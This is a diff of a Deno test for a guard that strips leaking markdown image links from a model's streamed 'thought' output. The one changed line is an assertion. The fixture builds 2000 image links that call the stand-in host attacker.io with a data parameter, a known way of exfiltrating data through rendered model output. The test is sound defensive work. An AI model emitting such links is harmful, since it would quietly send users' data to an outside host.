@@ -144,7 +144,7 @@ Deno.test('a thought writing leak after leak loses the rest, in time in proporti
   const pieces = Array.from({ length: 2000 }, (_, k) => `![x](https://attacker.io/p?d=${k}) `);
   const { shown } = think(guard, pieces);
   assertEquals(performance.now() - start < 3000, true);
-  assertEquals(shown.includes('attacker.io'), false);
+  assertEquals(/attacker\.io/.test(shown), false);
   assertEquals(
     shown.endsWith(OMIT_IMAGE.trimStart()) || shown.endsWith(OMIT_LINK.trimStart()),
     true,
